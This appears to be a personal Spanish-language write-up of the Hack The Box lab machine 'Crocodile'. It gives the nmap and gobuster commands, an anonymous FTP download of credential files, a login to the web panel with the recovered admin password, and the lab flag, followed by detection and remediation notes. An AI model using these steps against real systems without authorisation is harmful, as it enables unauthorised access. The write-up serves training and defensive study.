---
tags:
  - htb
  - starting-point
  - tier-1
  - easy
  - linux
  - ftp
  - credential-reuse
  - Terminada
ip: 10.129.69.47
os: Linux
difficulty: Easy
status: Terminada
tiempo: 1h 0m
fecha_inicio: 2026-08-13
fecha_completada: 2026-08-13
puntos: 0
mitre_tactics: [Reconnaissance, Initial Access, Credential Access]
mitre_techniques: [T1595, T1078, T1552]
---

# 🖥️ Crocodile — Linux — Easy (Tier 1)

> [!info] Resumen
> **IP:** `10.129.69.47` | **OS:** Linux | **Tier/Fase:** 1 | **Tiempo:** 1h 0m
> FTP anónimo expone archivos con credenciales — se reutilizan en el panel de login web para acceder como admin.

---

## 1. Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 10.129.69.47
```

| Puerto | Servicio | Versión             | Hallazgo clave                                 |
| ------ | -------- | ------------------- | ---------------------------------------------- |
| 21/TCP | ftp      | vsFTPd 3.0.3        | ftp-anon: Anonymous FTP login allowed          |
| 80/TCP | http     | Apache httpd 2.4.41 | http-title: Smash - Bootstrap Business Template |

**→ Vector:** FTP anónimo primero (suele contener el material para el segundo paso) — web después.

---

## 2. Explotación

> Vector principal: Credential reuse — FTP anónimo revela credenciales usadas en panel web (misconfiguration)

```bash
# Paso 1: FTP anónimo
ftp <IP>
# Name: anonymous
# Password: (Enter)

ftp> ls -la
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd

# Paso 2: revisar contenido descargado — buscar usuarios y contraseñas
cat allowed.userlist
cat allowed.userlist.passwd

# Paso 3: enumerar la web para encontrar el panel de login
gobuster dir -u http://10.129.69.47/ -w /usr/share/wordlists/dirb/common.txt
- Resultado: http://10.129.69.47/login.php

# Paso 4: probar las credenciales del FTP en el panel encontrado
User: admin
Password: rKXM59ESxesUFHAd
```

> [!success] Flag obtenida
> `c7110277ac44d78b6a9fff2232434d16`

---

## 3. Escalación de Privilegios

N/A — acceso directo vía panel web con credenciales reutilizadas.

---

## 4. MITRE ATT&CK

| Táctica           | Técnica                       | ID    | Uso en esta máquina                          |
| ------------------ | ------------------------------ | ----- | ----------------------------------------------- |
| Reconnaissance      | Active Scanning                | T1595 | nmap + gobuster para mapear servicios y rutas |
| Initial Access      | Valid Accounts                 | T1078 | Login en panel web con credenciales del FTP    |
| Credential Access   | Unsecured Credentials           | T1552 | Credenciales en texto plano dentro de archivos FTP |

---

## 5. Detección & Remediación

**Blue Team detecta:**
- Login FTP `anonymous` desde IP externa (log del servicio FTP)
- Acceso a archivos sensibles vía FTP sin autenticación real
- Login exitoso en panel web inmediatamente después de sesión FTP desde la misma IP — correlación temporal sospechosa

**Remediación:**
- Deshabilitar anonymous login en el servidor FTP (`anonymous_enable=NO`)
- Nunca almacenar credenciales en texto plano en ubicaciones accesibles sin autenticación
- Aplicar contraseñas distintas por servicio — la reutilización es lo que permite este ataque

---

## 6. Lecciones

- FTP anónimo no siempre es el objetivo final — revisar todo archivo descargable antes de descartar el servicio, aquí contenía usuarios y contraseñas para otro servicio.
- `allowed.userlist` + `allowed.userlist.passwd` separados en dos archivos: no asumir que las credenciales vienen juntas en un solo archivo.
- Encadenar FTP → gobuster → login web es el patrón: un hallazgo sin auth casi nunca es el final, es material para el siguiente paso.

**Bloqueado:**

| Fase | Causa | Fix |
|------|-------|-----|
| — | — | — |

---

## 7. ¿Qué vería un Threat Hunter?

- Login `anonymous` en logs FTP desde una IP externa, seguido de descarga de archivos con nombres que sugieren credenciales (`*.userlist`, `*.passwd`) — patrón reconocible incluso sin inspeccionar contenido.
- Request a `/login.php` con éxito inmediatamente después de la sesión FTP, misma IP origen — correlación temporal entre dos servicios distintos es la señal más fuerte, más que cualquier evento aislado.
- Sin correlación de logs entre servicios (FTP y web tratados como fuentes separadas), este ataque es prácticamente invisible — es el mismo punto ciego que en Sequel: el vector de red importa más que la lógica de aplicación.

---

## 8. Conexiones

- Similar: `[[HTB/Fawn/Fawn]]` (FTP anónimo — mismo punto de entrada, sin segundo paso de credential reuse)
- Técnica: `[[Técnicas/Credential-Reuse]]`
- Teoría: [`Guia_Basica_Crocodile`](obsidian://open?vault=RedTeamLab&file=HTB%2FCrocodile%2FGuia_Basica_Crocodile.pdf)

**Referencias:** [HackTricks - FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp) · [MITRE T1078](https://attack.mitre.org/techniques/T1078/)
